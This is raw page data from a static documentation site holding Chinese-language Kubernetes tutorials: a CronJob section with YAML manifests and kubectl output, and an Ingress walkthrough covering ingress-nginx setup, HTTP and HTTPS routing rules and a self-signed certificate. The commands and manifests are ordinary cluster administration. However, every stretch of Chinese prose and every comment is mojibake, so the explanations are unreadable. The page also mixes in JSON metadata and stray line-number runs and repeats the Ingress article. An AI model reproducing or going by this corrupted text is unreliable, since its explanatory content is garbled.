status    restarts   age\npc-job-684ft   1/1     running   0          5s\npc-job-jhj49   1/1     running   0          5s\npc-job-pfcvh   1/1     running   0          5s\npc-job-684ft   0/1     completed   0          11s\npc-job-v7rhr   0/1     pending     0          0s\npc-job-v7rhr   0/1     pending     0          0s\npc-job-v7rhr   0/1     containercreating   0          0s\npc-job-jhj49   0/1     completed           0          11s\npc-job-fhwf7   0/1     pending             0          0s\npc-job-fhwf7   0/1     pending             0          0s\npc-job-pfcvh   0/1     completed           0          11s\npc-job-5vg2j   0/1     pending             0          0s\npc-job-fhwf7   0/1     containercreating   0          0s\npc-job-5vg2j   0/1     pending             0          0s\npc-job-5vg2j   0/1     containercreating   0          0s\npc-job-fhwf7   1/1     running             0          2s\npc-job-v7rhr   1/1     running             0          2s\npc-job-5vg2j   1/1     running             0          3s\npc-job-fhwf7   0/1     completed           0          12s\npc-job-v7rhr   0/1     completed           0          12s\npc-job-5vg2j   0/1     completed           0          12s\n\n# å é¤job\n[root@k8s-master01 ~]# kubectl delete -f pc-job.yaml\njob.batch "pc-job" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# cronjob(cj)\n\ncronjob æ§å¶å¨ä»¥ job æ§å¶å¨èµæºä¸ºå¶ç®¡æ§å¯¹è±¡ï¼å¹¶åå©å®ç®¡ç pod èµæºå¯¹è±¡ï¼job æ§å¶å¨å®ä¹çä½ä¸ä»»å¡å¨å¶æ§å¶å¨èµæºåå»ºä¹åä¾¿ä¼ç«å³æ§è¡ï¼ä½ cronjob å¯ä»¥ä»¥ç±»ä¼¼äº linux æä½ç³»ç»çå¨ææ§ä»»å¡ä½ä¸è®¡åçæ¹å¼æ§å¶å¶è¿è¡æ¶é´ç¹åéå¤è¿è¡çæ¹å¼ãä¹å°±æ¯è¯´ï¼cronjob å¯ä»¥å¨ç¹å®çæ¶é´ç¹ (åå¤ç) å»è¿è¡ job ä»»å¡ã\n\n\n\ncronjob çèµæºæ¸åæä»¶ï¼\n\napiversion: batch/v1beta1 # çæ¬å·\nkind: cronjob # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: cronjob\nspec: # è¯¦ææè¿°\n  schedule: # cronæ ¼å¼çä½ä¸è°åº¦è¿è¡æ¶é´ç¹,ç¨äºæ§å¶ä»»å¡å¨ä»ä¹æ¶é´æ§è¡\n  concurrencypolicy: # å¹¶åæ§è¡ç­ç¥ï¼ç¨äºå®ä¹åä¸æ¬¡ä½ä¸è¿è¡å°æªå®ææ¶æ¯å¦ä»¥åå¦ä½è¿è¡åä¸æ¬¡çä½ä¸\n  failedjobhistorylimit: # ä¸ºå¤±è´¥çä»»å¡æ§è¡ä¿ççåå²è®°å½æ°ï¼é»è®¤ä¸º1\n  successfuljobhistorylimit: # ä¸ºæåçä»»å¡æ§è¡ä¿ççåå²è®°å½æ°ï¼é»è®¤ä¸º3\n  startingdeadlineseconds: # å¯å¨ä½ä¸éè¯¯çè¶æ¶æ¶é¿\n  jobtemplate: # jobæ§å¶å¨æ¨¡æ¿ï¼ç¨äºä¸ºcronjobæ§å¶å¨çæjobå¯¹è±¡;ä¸é¢å¶å®å°±æ¯jobçå®ä¹\n    metadata:\n    spec:\n      completions: 1\n      parallelism: 1\n      activedeadlineseconds: 30\n      backofflimit: 6\n      manualselector: true\n      selector:\n        matchlabels:\n          app: counter-pod\n        matchexpressions: è§å\n          - {key: app, operator: in, values: [counter-pod]}\n      template:\n        metadata:\n          labels:\n            app: counter-pod\n        spec:\n          restartpolicy: never \n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 20;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\néè¦éç¹è§£éçå ä¸ªéé¡¹ï¼\nschedule: cronè¡¨è¾¾å¼ï¼ç¨äºæå®ä»»å¡çæ§è¡æ¶é´\n    */1    *      *    *     *\n    <åé> <å°æ¶> <æ¥> <æä»½> <ææ>\n\n    åé å¼ä» 0 å° 59.\n    å°æ¶ å¼ä» 0 å° 23.\n    æ¥ å¼ä» 1 å° 31.\n    æ å¼ä» 1 å° 12.\n    ææ å¼ä» 0 å° 6, 0 ä»£è¡¨æææ¥\n    å¤ä¸ªæ¶é´å¯ä»¥ç¨éå·éå¼ï¼ èå´å¯ä»¥ç¨è¿å­ç¬¦ç»åºï¼*å¯ä»¥ä½ä¸ºééç¬¦ï¼ /è¡¨ç¤ºæ¯...\nconcurrencypolicy: æ¯å¦aä»»å¡1åéè¿è¡ä¸æ¬¡ï¼å¯æ¯aä»»å¡æ¬æ¬¡è¿è¡äºè¶è¿1åéï¼é£ä¹æ¯å¦åè®¸è®©ä¸ä¸ªå¨æçä»»å¡è¿è¡ï¼\n    allow:   åè®¸jobså¹¶åè¿è¡(é»è®¤)\n    forbid:  ç¦æ­¢å¹¶åè¿è¡ï¼å¦æä¸ä¸æ¬¡è¿è¡å°æªå®æï¼åè·³è¿ä¸ä¸æ¬¡è¿è¡\n    replace: æ¿æ¢ï¼åæ¶å½åæ­£å¨è¿è¡çä½ä¸å¹¶ç¨æ°ä½ä¸æ¿æ¢å®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå»º pc-cronjob.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: batch/v1beta1\nkind: cronjob\nmetadata:\n  name: pc-cronjob\n  namespace: dev\n  labels:\n    controller: cronjob\nspec:\n  schedule: "*/1 * * * *"\n  jobtemplate:\n    metadata:\n    spec:\n      template:\n        spec:\n          restartpolicy: never\n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# åå»ºcronjob\n[root@k8s-master01 ~]# kubectl create -f pc-cronjob.yaml\ncronjob.batch/pc-cronjob created\n\n# æ¥çcronjob\n[root@k8s-master01 ~]# kubectl get cronjobs -n dev\nname         schedule      suspend   active   last schedule   age\npc-cronjob   */1 * * * *   false     0        <none>          6s\n\n# æ¥çjob\n[root@k8s-master01 ~]# kubectl get jobs -n dev\nname                    completions   duration   age\npc-cronjob-1592587800   1/1           28s        3m26s\npc-cronjob-1592587860   1/1           28s        2m26s\npc-cronjob-1592587920   1/1           28s        86s\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\npc-cronjob-1592587800-x4tsm   0/1     completed   0          2m24s\npc-cronjob-1592587860-r5gv4   0/1     completed   0          84s\npc-cronjob-1592587920-9dxxq   1/1     running     0          24s\n\n\n# å é¤cronjob\n[root@k8s-master01 ~]# kubectl  delete -f pc-cronjob.yaml\ncronjob.batch "pc-cronjob" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n',charsets:{cjk:!0}},{title:"kubernetes(å) Ingressä»ç»åä½¿ç¨",frontmatter:{title:"kubernetes(å) Ingressä»ç»åä½¿ç¨",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/609",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/609.kubernetes(%E5%8D%81)%20Ingress%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8.html",relativePath:"04.è¿ç»´/60.Kubernetes/609.kubernetes(å) Ingressä»ç»åä½¿ç¨.md",key:"v-145b2bd8",path:"/kubernetes/609/",headers:[{level:2,title:"Ingressä»ç»",slug:"ingressä»ç»",normalizedTitle:"ingress ä»ç»",charIndex:2},{level:2,title:"Ingressä½¿ç¨",slug:"ingressä½¿ç¨",normalizedTitle:"ingress ä½¿ç¨",charIndex:895},{level:3,title:"ç¯å¢åå¤",slug:"ç¯å¢åå¤",normalizedTitle:"ç¯å¢åå¤",charIndex:910},{level:3,title:"Httpä»£ç",slug:"httpä»£ç",normalizedTitle:"http ä»£ç",charIndex:3972},{level:3,title:"Httpsä»£ç",slug:"httpsä»£ç",normalizedTitle:"https ä»£ç",charIndex:5317}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Ingressä»ç» Ingressä½¿ç¨ ç¯å¢åå¤ Httpä»£ç Httpsä»£ç",content:'# Ingress ä»ç»\n\nå¨åé¢è¯¾ç¨ä¸­å·²ç»æå°ï¼Service å¯¹éç¾¤ä¹å¤æ´é²æå¡çä¸»è¦æ¹å¼æä¸¤ç§ï¼NotePort å LoadBalancerï¼ä½æ¯è¿ä¸¤ç§æ¹å¼ï¼é½æä¸å®çç¼ºç¹ï¼\n\n * NodePort æ¹å¼çç¼ºç¹æ¯ä¼å ç¨å¾å¤éç¾¤æºå¨çç«¯å£ï¼é£ä¹å½éç¾¤æå¡åå¤çæ¶åï¼è¿ä¸ªç¼ºç¹å°±æåææ¾\n * LB æ¹å¼çç¼ºç¹æ¯æ¯ä¸ª service éè¦ä¸ä¸ª LBï¼æµªè´¹ãéº»ç¦ï¼å¹¶ä¸éè¦ kubernetes ä¹å¤è®¾å¤çæ¯æ\n\nåºäºè¿ç§ç°ç¶ï¼kubernetes æä¾äº Ingress èµæºå¯¹è±¡ï¼Ingress åªéè¦ä¸ä¸ª NodePort æèä¸ä¸ª LB å°±å¯ä»¥æ»¡è¶³æ´é²å¤ä¸ª Service çéæ±ãå·¥ä½æºå¶å¤§è´å¦ä¸å¾è¡¨ç¤ºï¼\n\n\n\nå®éä¸ï¼Ingress ç¸å½äºä¸ä¸ª 7 å±çè´è½½åè¡¡å¨ï¼æ¯ kubernetes å¯¹ååä»£ççä¸ä¸ªæ½è±¡ï¼å®çå·¥ä½åçç±»ä¼¼äº Nginxï¼å¯ä»¥çè§£æå¨ Ingress éå»ºç«è¯¸å¤æ å°è§åï¼Ingress Controller éè¿çå¬è¿äºéç½®è§åå¹¶è½¬åæ Nginx çååä»£çéç½®ï¼ç¶åå¯¹å¤é¨æä¾æå¡ãå¨è¿éæä¸¤ä¸ªæ ¸å¿æ¦å¿µï¼\n\n * ingressï¼kubernetes ä¸­çä¸ä¸ªå¯¹è±¡ï¼ä½ç¨æ¯å®ä¹è¯·æ±å¦ä½è½¬åå° service çè§å\n * ingress controllerï¼å·ä½å®ç°ååä»£çåè´è½½åè¡¡çç¨åºï¼å¯¹ ingress å®ä¹çè§åè¿è¡è§£æï¼æ ¹æ®éç½®çè§åæ¥å®ç°è¯·æ±è½¬åï¼å®ç°æ¹å¼æå¾å¤ï¼æ¯å¦ Nginx, Contour, Haproxy ç­ç­\n\nIngressï¼ä»¥ Nginx ä¸ºä¾ï¼çå·¥ä½åçå¦ä¸ï¼\n\n 1. ç¨æ·ç¼å Ingress è§åï¼è¯´æåªä¸ªååå¯¹åº kubernetes éç¾¤ä¸­çåªä¸ª Service\n 2. Ingress æ§å¶å¨å¨ææç¥ Ingress æå¡è§åçååï¼ç¶åçæä¸æ®µå¯¹åºç Nginx ååä»£çéç½®\n 3. Ingress æ§å¶å¨ä¼å°çæç Nginx éç½®åå¥å°ä¸ä¸ªè¿è¡çç Nginx æå¡ä¸­ï¼å¹¶å¨ææ´æ°\n 4. å°æ­¤ä¸ºæ­¢ï¼å¶å®çæ­£å¨å·¥ä½çå°±æ¯ä¸ä¸ª Nginx äºï¼åé¨éç½®äºç¨æ·å®ä¹çè¯·æ±è½¬åè§å\n\n\n\n\n# Ingress ä½¿ç¨\n\n\n# ç¯å¢åå¤\n\næ­å»º ingress ç¯å¢\n\n# åå»ºæä»¶å¤¹\n[root@k8s-master01 ~]# mkdir ingress-controller\n[root@k8s-master01 ~]# cd ingress-controller/\n\n# è·åingress-nginxï¼æ¬æ¬¡æ¡ä¾ä½¿ç¨çæ¯0.30çæ¬\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/mandatory.yaml\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml\n\n# ä¿®æ¹mandatory.yamlæä»¶ä¸­çä»åº\n# ä¿®æ¹quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# ä¸ºquay-mirror.qiniu.com/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# åå»ºingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl apply -f ./\n\n# æ¥çingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl get pod -n ingress-nginx\nNAME                                           READY   STATUS    RESTARTS   AGE\npod/nginx-ingress-controller-fbf967dd5-4qpbp   1/1     Running   0          12h\n\n# æ¥çservice\n[root@k8s-master01 ingress-controller]# kubectl get svc -n ingress-nginx\nNAME            TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)                      AGE\ningress-nginx   NodePort   10.98.75.163   <none>        80:32240/TCP,443:31335/TCP   11h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nåå¤ service å pod\nä¸ºäºåé¢çå®éªæ¯è¾æ¹ä¾¿ï¼åå»ºå¦ä¸å¾æç¤ºçæ¨¡å\n\n\n\nåå»º tomcat-nginx.yaml\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n---\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tomcat-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: tomcat-pod\n  template:\n    metadata:\n      labels:\n        app: tomcat-pod\n    spec:\n      containers:\n      - name: tomcat\n        image: tomcat:8.5-jre10-slim\n        ports:\n        - containerPort: 8080\n\n---\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: nginx-service\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterIP: None\n  type: ClusterIP\n  ports:\n  - port: 80\n    targetPort: 80\n\n---\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: tomcat-service\n  namespace: dev\nspec:\n  selector:\n    app: tomcat-pod\n  clusterIP: None\n  type: ClusterIP\n  ports:\n  - port: 8080\n    targetPort: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n\n\n# åå»º\n[root@k8s-master01 ~]# kubectl create -f tomcat-nginx.yaml\n\n# æ¥ç\n[root@k8s-master01 ~]# kubectl get svc -n dev\nNAME             TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)    AGE\nnginx-service    ClusterIP   None         <none>        80/TCP     48s\ntomcat-service   ClusterIP   None         <none>        8080/TCP   48s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# Http ä»£ç\n\nåå»º ingress-http.yaml\n\napiVersion: extensions/v1beta1\nkind: Ingress\nmetadata:\n  name: ingress-http\n  namespace: dev\nspec:\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: nginx-service\n          servicePort: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: tomcat-service\n          servicePort: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# åå»º\n[root@k8s-master01 ~]# kubectl create -f ingress-http.yaml\ningress.extensions/ingress-http created\n\n# æ¥ç\n[root@k8s-master01 ~]# kubectl get ing ingress-http -n dev\nNAME           HOSTS                                  ADDRESS   PORTS   AGE\ningress-http   nginx.itheima.com,tomcat.itheima.com             80      22s\n\n# æ¥çè¯¦æ\n[root@k8s-master01 ~]# kubectl describe ing ingress-http  -n dev\n...\nRules:\nHost                Path  Backends\n----                ----  --------\nnginx.itheima.com   / nginx-service:80 (10.244.1.96:80,10.244.1.97:80,10.244.2.112:80)\ntomcat.itheima.com  / tomcat-service:8080(10.244.1.94:8080,10.244.1.95:8080,10.244.2.111:8080)\n...\n\n# æ¥ä¸æ¥,å¨æ¬å°çµèä¸éç½®hostæä»¶,è§£æä¸é¢çä¸¤ä¸ªååå°192.168.109.100(master)ä¸\n# ç¶å,å°±å¯ä»¥åå«è®¿é®tomcat.itheima.com:32240  å  nginx.itheima.com:32240 æ¥çææäº\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# Https ä»£ç\n\nåå»ºè¯ä¹¦\n\n# çæè¯ä¹¦\nopenssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj "/C=CN/ST=BJ/L=BJ/O=nginx/CN=itheima.com"\n\n# åå»ºå¯é¥\nkubectl create secret tls tls-secret --key tls.key --cert tls.crt\n\n\n1\n2\n3\n4\n5\n\n\nåå»º ingress-https.yaml\n\napiVersion: extensions/v1beta1\nkind: Ingress\nmetadata:\n  name: ingress-https\n  namespace: dev\nspec:\n  tls:\n    - hosts:\n      - nginx.itheima.com\n      - tomcat.itheima.com\n      secretName: tls-secret # æå®ç§é¥\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: nginx-service\n          servicePort: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: tomcat-service\n          servicePort: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# åå»º\n[root@k8s-master01 ~]# kubectl create -f ingress-https.yaml\ningress.extensions/ingress-https created\n\n# æ¥ç\n[root@k8s-master01 ~]# kubectl get ing ingress-https -n dev\nNAME            HOSTS                                  ADDRESS         PORTS     AGE\ningress-https   nginx.itheima.com,tomcat.itheima.com   10.104.184.38   80, 443   2m42s\n\n# æ¥çè¯¦æ\n[root@k8s-master01 ~]# kubectl describe ing ingress-https -n dev\n...\nTLS:\n  tls-secret terminates nginx.itheima.com,tomcat.itheima.com\nRules:\nHost              Path Backends\n----              ---- --------\nnginx.itheima.com  /  nginx-service:80 (10.244.1.97:80,10.244.1.98:80,10.244.2.119:80)\ntomcat.itheima.com /  tomcat-service:8080(10.244.1.99:8080,10.244.2.117:8080,10.244.2.120:8080)\n...\n\n# ä¸é¢å¯ä»¥éè¿æµè§å¨è®¿é®https://nginx.itheima.com:31335 å https://tomcat.itheima.com:31335æ¥æ¥çäº\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n',normalizedContent:'# ingress ä»ç»\n\nå¨åé¢è¯¾ç¨ä¸­å·²ç»æå°ï¼service å¯¹éç¾¤ä¹å¤æ´é²æå¡çä¸»è¦æ¹å¼æä¸¤ç§ï¼noteport å loadbalancerï¼ä½æ¯è¿ä¸¤ç§æ¹å¼ï¼é½æä¸å®çç¼ºç¹ï¼\n\n * nodeport æ¹å¼çç¼ºç¹æ¯ä¼å ç¨å¾å¤éç¾¤æºå¨çç«¯å£ï¼é£ä¹å½éç¾¤æå¡åå¤çæ¶åï¼è¿ä¸ªç¼ºç¹å°±æåææ¾\n * lb æ¹å¼çç¼ºç¹æ¯æ¯ä¸ª service éè¦ä¸ä¸ª lbï¼æµªè´¹ãéº»ç¦ï¼å¹¶ä¸éè¦ kubernetes ä¹å¤è®¾å¤çæ¯æ\n\nåºäºè¿ç§ç°ç¶ï¼kubernetes æä¾äº ingress èµæºå¯¹è±¡ï¼ingress åªéè¦ä¸ä¸ª nodeport æèä¸ä¸ª lb å°±å¯ä»¥æ»¡è¶³æ´é²å¤ä¸ª service çéæ±ãå·¥ä½æºå¶å¤§è´å¦ä¸å¾è¡¨ç¤ºï¼\n\n\n\nå®éä¸ï¼ingress ç¸å½äºä¸ä¸ª 7 å±çè´è½½åè¡¡å¨ï¼æ¯ kubernetes å¯¹ååä»£ççä¸ä¸ªæ½è±¡ï¼å®çå·¥ä½åçç±»ä¼¼äº nginxï¼å¯ä»¥çè§£æå¨ ingress éå»ºç«è¯¸å¤æ å°è§åï¼ingress controller éè¿çå¬è¿äºéç½®è§åå¹¶è½¬åæ nginx çååä»£çéç½®ï¼ç¶åå¯¹å¤é¨æä¾æå¡ãå¨è¿éæä¸¤ä¸ªæ ¸å¿æ¦å¿µï¼\n\n * ingressï¼kubernetes ä¸­çä¸ä¸ªå¯¹è±¡ï¼ä½ç¨æ¯å®ä¹è¯·æ±å¦ä½è½¬åå° service çè§å\n * ingress controllerï¼å·ä½å®ç°ååä»£çåè´è½½åè¡¡çç¨åºï¼å¯¹ ingress å®ä¹çè§åè¿è¡è§£æï¼æ ¹æ®éç½®çè§åæ¥å®ç°è¯·æ±è½¬åï¼å®ç°æ¹å¼æå¾å¤ï¼æ¯å¦ nginx, contour, haproxy ç­ç­\n\ningressï¼ä»¥ nginx ä¸ºä¾ï¼çå·¥ä½åçå¦ä¸ï¼\n\n 1. ç¨æ·ç¼å ingress è§åï¼è¯´æåªä¸ªååå¯¹åº kubernetes éç¾¤ä¸­çåªä¸ª service\n 2. ingress æ§å¶å¨å¨ææç¥ ingress æå¡è§åçååï¼ç¶åçæä¸æ®µå¯¹åºç nginx ååä»£çéç½®\n 3. ingress æ§å¶å¨ä¼å°çæç nginx éç½®åå¥å°ä¸ä¸ªè¿è¡çç nginx æå¡ä¸­ï¼å¹¶å¨ææ´æ°\n 4. å°æ­¤ä¸ºæ­¢ï¼å¶å®çæ­£å¨å·¥ä½çå°±æ¯ä¸ä¸ª nginx äºï¼åé¨éç½®äºç¨æ·å®ä¹çè¯·æ±è½¬åè§å\n\n\n\n\n# ingress ä½¿ç¨\n\n\n# ç¯å¢åå¤\n\næ­å»º ingress ç¯å¢\n\n# åå»ºæä»¶å¤¹\n[root@k8s-master01 ~]# mkdir ingress-controller\n[root@k8s-master01 ~]# cd ingress-controller/\n\n# è·åingress-nginxï¼æ¬æ¬¡æ¡ä¾ä½¿ç¨çæ¯0.30çæ¬\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/mandatory.yaml\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml\n\n# ä¿®æ¹mandatory.yamlæä»¶ä¸­çä»åº\n# ä¿®æ¹quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# ä¸ºquay-mirror.qiniu.com/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# åå»ºingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl apply -f ./\n\n# æ¥çingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl get pod -n ingress-nginx\nname                                           ready   status    restarts   age\npod/nginx-ingress-controller-fbf967dd5-4qpbp   1/1     running   0          12h\n\n# æ¥çservice\n[root@k8s-master01 ingress-controller]# kubectl get svc -n ingress-nginx\nname            type       cluster-ip     external-ip   port(s)                      age\ningress-nginx   nodeport   10.98.75.163   <none>        80:32240/tcp,443:31335/tcp   11h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nåå¤ service å pod\nä¸ºäºåé¢çå®éªæ¯è¾æ¹ä¾¿ï¼åå»ºå¦ä¸å¾æç¤ºçæ¨¡å\n\n\n\nåå»º tomcat-nginx.yaml\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: nginx-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n---\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: tomcat-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchlabels:\n      app: tomcat-pod\n  template:\n    metadata:\n      labels:\n        app: tomcat-pod\n    spec:\n      containers:\n      - name: tomcat\n        image: tomcat:8.5-jre10-slim\n        ports:\n        - containerport: 8080\n\n---\n\napiversion: v1\nkind: service\nmetadata:\n  name: nginx-service\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterip: none\n  type: clusterip\n  ports:\n  - port: 80\n    targetport: 80\n\n---\n\napiversion: v1\nkind: service\nmetadata:\n  name: tomcat-service\n  namespace: dev\nspec:\n  selector:\n    app: tomcat-pod\n  clusterip: none\n  type: clusterip\n  ports:\n  - port: 8080\n    targetport: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n\n\n# åå»º\n[root@k8s-master01 ~]# kubectl create -f tomcat-nginx.yaml\n\n# æ¥ç\n[root@k8s-master01 ~]# kubectl get svc -n dev\nname             type        cluster-ip   external-ip   port(s)    age\nnginx-service    clusterip   none         <none>        80/tcp     48s\ntomcat-service   clusterip   none         <none>        8080/tcp   48s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# http ä»£ç\n\nåå»º ingress-http.yaml\n\napiversion: extensions/v1beta1\nkind: ingress\nmetadata:\n  name: ingress-http\n  namespace: dev\nspec:\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: nginx-service\n          serviceport: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: tomcat-service\n          serviceport: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# åå»º\n[root@k8s-master01 ~]# kubectl create -f ingress-http.yaml\ningress.extensions/ingress-http created\n\n# æ¥ç\n[root@k8s-master01 ~]# kubectl get ing ingress-http -n dev\nname           hosts                                  address   ports   age\ningress-http   nginx.itheima.com,tomcat.itheima.com             80      22s\n\n# æ¥çè¯¦æ\n[root@k8s-master01 ~]# kubectl describe ing ingress-http  -n dev\n...\nrules:\nhost                path  backends\n----                ----  --------\nnginx.itheima.com   / nginx-service:80 (10.244.1.96:80,10.244.1.97:80,10.244.2.112:80)\ntomcat.itheima.com  / tomcat-service:8080(10.244.1.94:8080,10.244.1.95:8080,10.244.2.111:8080)\n...\n\n# æ¥ä¸æ¥,å¨æ¬å°çµèä¸éç½®hostæä»¶,è§£æä¸é¢çä¸¤ä¸ªååå°192.168.109.100(master)ä¸\n# ç¶å,å°±å¯ä»¥åå«è®¿é®tomcat.itheima.com:32240  å  nginx.itheima.com:32240 æ¥çææäº\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# https ä»£ç\n\nåå»ºè¯ä¹¦\n\n# çæè¯ä¹¦\nopenssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj "/c=cn/st=bj/l=bj/o=nginx/cn=itheima.com"\n\n# åå»ºå¯é¥\nkubectl create secret tls tls-secret --key tls.key --cert tls.crt\n\n\n1\n2\n3\n4\n5\n\n\nåå»º ingress-https.yaml\n\napiversion: extensions/v1beta1\nkind: ingress\nmetadata:\n  name: ingress-https\n  namespace: dev\nspec:\n  tls:\n    - hosts:\n      - nginx.itheima.com\n      - tomcat.itheima.com\n      secretname: tls-secret # æå®ç§é¥\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: nginx-service\n          serviceport: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: tomcat-service\n          serviceport: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# åå»º\n[root@k8s-master01 ~]# kubectl create -f ingress-https.yaml\ningress.extensions/ingress-https created\n\n# 